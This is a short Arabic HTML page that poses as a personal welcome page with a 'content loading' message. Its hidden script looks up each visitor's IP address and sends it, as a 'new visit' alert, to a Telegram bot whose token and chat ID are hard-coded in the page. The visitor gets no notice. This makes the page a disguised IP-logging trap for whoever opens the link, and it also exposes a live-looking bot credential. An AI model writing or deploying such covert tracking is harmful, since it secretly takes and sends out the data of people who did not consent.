<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً بك!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 { color: #2c3e50; }
    </style>
</head>
<body>
    <h1>مرحباً بك في موقعي! ✨</h1>
    <p>جاري تحميل المحتوى، انتظر لحظة...</p>

    <script>
        const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
        const CHAT_ID = '6663398412';

        // استخدام خدمة بديلة وسريعة لجلب الـ IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                const userIp = ipData.ip;
                const message = `🔔 **زيارة جديدة للموقع!**\n\n` +
                                `🌐 **عنوان الـ IP:** ${userIp}\n` +
                                `📱 **التفاصيل:** تم فتح الرابط بنجاح!`;

                // إرسال الإشعار لتليجرام فوراً
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            })
            .catch(err => console.log('Error:', err));
    </script>
</body>
</html>
